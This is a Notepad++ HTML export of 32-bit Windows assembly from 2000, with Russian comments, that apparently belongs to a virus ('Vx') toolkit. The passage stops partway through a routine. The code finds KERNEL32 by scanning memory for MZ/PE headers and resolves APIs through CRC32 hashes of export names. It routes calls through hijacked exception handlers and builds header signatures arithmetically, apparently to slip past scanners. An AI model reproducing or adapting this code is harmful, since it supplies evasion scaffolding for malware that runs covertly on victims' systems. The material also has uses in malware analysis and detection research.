<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; last edit 10.06.2000</span><span class="sc0">
</span><span class="sc1">; -//-      07.07.2000 bug fix</span><span class="sc0">
</span><span class="sc1">; -//-      13.07.2000</span><span class="sc0">
</span><span class="sc5">offset2</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">Arg</span><span class="sc4">,</span><span class="sc5">RelPoint</span><span class="sc0">
</span><span class="sc5">offset2</span><span class="sc4">&amp;</span><span class="sc5">Arg</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Arg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RelPoint</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">; На входе EDI=KernelHahdler</span><span class="sc0">
</span><span class="sc1">; Если EDI=0  инициализация на KERNELL32.dll</span><span class="sc0">
</span><span class="sc5">Kern32VxInit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Kern32VxInitL1</span><span class="sc0">
</span><span class="sc5">hKernelHahdler</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lpExportTable</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CRC32APIf</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@Kern32VxInitL1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                 </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">@@@L1</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetKernelHahdlerA</span><span class="sc0">
                 </span><span class="sc5">@@@L1</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">EDI</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">EDI</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; eax=offset 2 PE</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; esi=Export Table RVA 2 USER32.dll</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                 </span><span class="sc5">offset2</span><span class="sc0"> </span><span class="sc5">Call_Win_AIP32</span><span class="sc4">,</span><span class="sc5">hKernelHahdler</span><span class="sc0">

                 </span><span class="sc1">;add eax,offset2Call_Win_AIP32</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">offset2Call_Win_AIP32</span><span class="sc0">

                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc6">popa</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">ExeptionRecord</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">ExeptionAddress</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">0ch</span><span class="sc0">
 </span><span class="sc5">ContextBlock</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">0ch</span><span class="sc0">
 </span><span class="sc5">OldESPreg</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">0c4h</span><span class="sc0">
 </span><span class="sc5">pushadd</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">Call_Win_AIP32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pushadd</span><span class="sc4">+</span><span class="sc5">ExeptionRecord</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ExeptionAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUGFLAG</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EXCEPTION_ILLEGAL_INSTRUCTION</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">NotKern32VXAPI</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
               </span><span class="sc9">ELSE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EXCEPTION_BREAKPOINT</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">NotKern32VXAPI</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0cch</span><span class="sc0">
               </span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">NotKern32VXAPI</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;--------</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; ret point</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pushadd</span><span class="sc4">+</span><span class="sc5">ContextBlock</span><span class="sc4">]</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">OldESPreg</span><span class="sc4">]</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get CRC32</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; save  ret point</span><span class="sc0">
                 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">Call_Win_AIP32L1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Call_Win_AIP32L1</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hKernelHahdler</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; API CRC32</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                  </span><span class="sc1">;esi = Export Table</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Num of Name Pointers</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Offset 2 Name Pointers RVA</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">HEA_HE_OHA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; esi = Name of func</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRCSum</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                  </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">BOT_OHA</span><span class="sc0">
                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">HEA_HE_OHA</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                  </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">FuncNotFound</span><span class="sc0">
          </span><span class="sc5">BOT_OHA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; eax=#</span><span class="sc0">
                   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; *2</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Ordinal Table RVA</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Func Ordinal }|{                        }</span><span class="sc0">
                   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; - Ordinal Base</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Address Table RVA</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                   </span><span class="sc1">; eax=ProcAdderss</span><span class="sc0">
                   </span><span class="sc1">;-----------------------------</span><span class="sc0">
    </span><span class="sc5">FuncNotFound</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                   </span><span class="sc1">;-----------------------------</span><span class="sc0">
                 </span><span class="sc5">OldEDIreg</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">9ch</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pushadd</span><span class="sc4">+</span><span class="sc5">ContextBlock</span><span class="sc4">]</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">OldEDIreg</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; skip eax</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                 </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">FuncNotFoundL2</span><span class="sc0">
                 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; GO GO GO !</span><span class="sc0">
</span><span class="sc5">NotKern32VXAPI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">
                 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; next ERR</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FuncNotFoundL2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; eax=-1 В случае если нет такой CRC32</span><span class="sc0">
                 </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Процедура возвращает:</span><span class="sc0">
</span><span class="sc1">;     EDI=KernelHahdler</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Найдем кернел</span><span class="sc0">
</span><span class="sc5">GetKernelHahdlerA</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc0">
         </span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetKernelHahdler</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Получили указатель в Kernel32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; CTEK наместо</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; ret old seh</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

         </span><span class="sc1">; Теперь поищем MZ</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc12">'ZM'</span><span class="sc4">-</span><span class="sc2">1111h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111h</span><span class="sc0">
</span><span class="sc5">SetMySEH</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MySEH</span><span class="sc0">
</span><span class="sc5">RetEDISize</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GdeMZK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@GdeMZK32</span><span class="sc0">
</span><span class="sc5">@@GdeMZK32</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Востановим после исключения.</span><span class="sc0">

           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc12">'ZM'</span><span class="sc4">-</span><span class="sc2">1111h</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111h</span><span class="sc0">
           </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">SetMySEH</span><span class="sc0">

</span><span class="sc5">GdeMZK32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">GdeMZ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">je_</span><span class="sc0"> </span><span class="sc5">@MZ</span><span class="sc0">
         </span><span class="sc5">jmp_</span><span class="sc0"> </span><span class="sc5">GdeMZ</span><span class="sc0">
</span><span class="sc5">@MZ</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">jl_</span><span class="sc0"> </span><span class="sc5">GdeMZ</span><span class="sc0">                  </span><span class="sc1">; Будем искать другой MZ</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc12">'EP'</span><span class="sc4">-</span><span class="sc2">2222h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2222h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; Вроде PE ?</span><span class="sc0">
         </span><span class="sc5">jne_</span><span class="sc0"> </span><span class="sc5">GdeMZ</span><span class="sc0">
         </span><span class="sc5">ExportTable_RVA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
         </span><span class="sc5">Name_RVA</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ExportTable_RVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ExportTable_RVA</span><span class="sc0">
